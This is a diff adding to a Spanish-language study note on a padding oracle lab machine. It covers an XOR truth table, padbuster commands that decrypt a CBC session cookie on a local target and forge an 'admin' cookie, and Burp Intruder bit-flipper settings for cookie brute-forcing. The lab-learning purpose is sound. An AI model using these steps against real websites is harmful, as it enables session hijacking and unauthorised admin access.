@@ -30,9 +30,52 @@ A continuación, se proporciona el enlace directo de descarga a la máquina ‘P
 
 -   **Pentester Lab** **– Padding Oracle**: [https://www.vulnhub.com/?q=padding+oracle](https://www.vulnhub.com/?q=padding+oracle)
 
+![00x400](Pasted%20image%2020230429025642.png)
+
+![00x400](Pasted%20image%2020230429030420.png)
+
+![](Pasted%20image%2020230429025857.png)
+
+![00x400](Pasted%20image%2020230429030239.png)
+
+Esta es la tabla de verdad de la compuerta XOR
+|XOR|----|
+|-----|-----|
+|0 0|0|
+|1 0|1|
+|0 1|1|
+|1 1|0|
+
+
 ## Comandos
 
+Si la web es vulnerable a Padding Attack, podemos decifrar la **Cookie de session cifrada** y nos quedaria en texto plano.
+* El tamano del bloque en el cifrado CBC debe ser multiplo de 8 bits = 1 byte.
+* El valor de la Cookie de Session lo extraemos de la web **Inspect > Storage > Cookies > Value**
 
 ```bash
-❯ 
+❯ padbuster http://127.0.0.1 x4ChsJumLYFLF7MHGRFDEwFH1682792456 8 -cookies 'auth=x4ChsJumLYFLF7MHGRFDEwFH1682792456'     # Descifraremos la Cookie de Session 
+
+	# url = Url de la web victima
+	# cookie = Valor de la Cookie de Session
+	# Blocksize = 8
+	# cookies = Es la auth de la Cookie y le colocamos el mismo valor
+	# Cuando nos pregunte ID marker, colocamos un 2
 ```
+
+Despues de descifrarnos la Cookie en testo plano 'user=omar', podemos crear una nueva Cookie de Session pero con otro valor, en este caso podriamos hacer una para 'admin'.
+```bash
+❯ padbuster http://127.0.0.1 x4ChsJumLYFLF7MHGRFDEwFH1682792456 8 -cookies 'auth=x4ChsJumLYFLF7MHGRFDEwFH1682792456' -plaintext 'user=admin'  # Cifraremos la Cookie de Session 
+
+	# Cuando nos pregunte ID marker, colocamos un 2
+```
+
+El nuevo valor obtenido lo volvemos a colocar en donde estaba la anterior Cookie de Session y recargamos la web. Por lo que ahora seriamos 'admin'
+
+Tambien podemos hacer ataques de **Fuerza Bruta con BurpSuite** en el **Intruder** y asi poder variaciones de **Cookies de Session** para diferentes usuarios muy cercanos 
+* Tipo Sniper
+* Payload set: 1
+* Payload Type: Bit Flipper
+* Operate on: Base value of payload position
+* Format of original data: Literal value
+* Quitar el 'check' a URL-encode these characters
